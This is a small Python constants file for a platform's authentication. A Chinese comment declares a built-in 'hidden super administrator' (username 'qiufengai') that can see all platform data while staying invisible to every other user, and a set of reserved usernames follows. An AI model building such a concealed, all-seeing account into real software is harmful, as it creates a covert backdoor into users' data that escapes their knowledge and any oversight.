"""认证相关常量"""

# 内置隐身超级管理员：仅本人可见全平台数据，其他用户不可见其任何信息
HIDDEN_SUPER_USERNAME = "qiufengai"

RESERVED_USERNAMES = frozenset(
    {
        "root",
        "admin",
        "super_admin",
        "superadmin",
        "qiufengai",
        "system",
    }
)
